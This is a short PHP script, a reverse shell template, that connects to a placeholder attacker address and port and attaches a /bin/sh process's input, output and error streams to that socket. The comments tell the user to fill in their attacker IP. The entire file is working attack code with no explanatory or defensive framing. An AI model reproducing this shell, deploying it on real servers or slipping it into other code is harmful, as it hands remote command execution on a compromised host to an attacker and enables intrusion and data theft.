<?php
// Reverse shell - Change IP and port to match the attacker's machine
$ip = 'YOUR_ATTACKER_IP';  // Your attacker's IP
$port = YOUR_PORT;  // A port that your machine will listen on
$sock = fsockopen($ip, $port);
$cmd = '/bin/sh';  // Shell to execute
$descriptorspec = array(
   0 => $sock,  // stdin is a socket to the attacker
   1 => $sock,  // stdout is a socket to the attacker
   2 => $sock   // stderr is a socket to the attacker
);
$process = proc_open($cmd, $descriptorspec, $pipes);
